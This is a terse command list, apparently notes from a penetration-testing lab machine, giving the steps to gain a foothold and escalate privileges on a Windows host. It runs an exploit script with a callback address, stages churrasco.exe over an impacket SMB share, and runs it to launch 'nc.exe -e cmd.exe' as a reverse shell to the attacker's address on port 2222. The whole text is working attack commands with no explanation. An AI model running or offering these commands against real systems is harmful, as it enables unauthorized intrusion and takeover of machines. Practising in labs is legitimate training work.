```
# Foothold
python exploit.py 10.10.10.14 80 10.10.17.x 1111

# Priv
cd /usr/share/sqlninja/apps
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .

copy \\10.10.17.x\share\churrasco.exe churrasco.exe

churrasco.exe -d "nc.exe -e cmd.exe 10.10.17.x 2222"
```
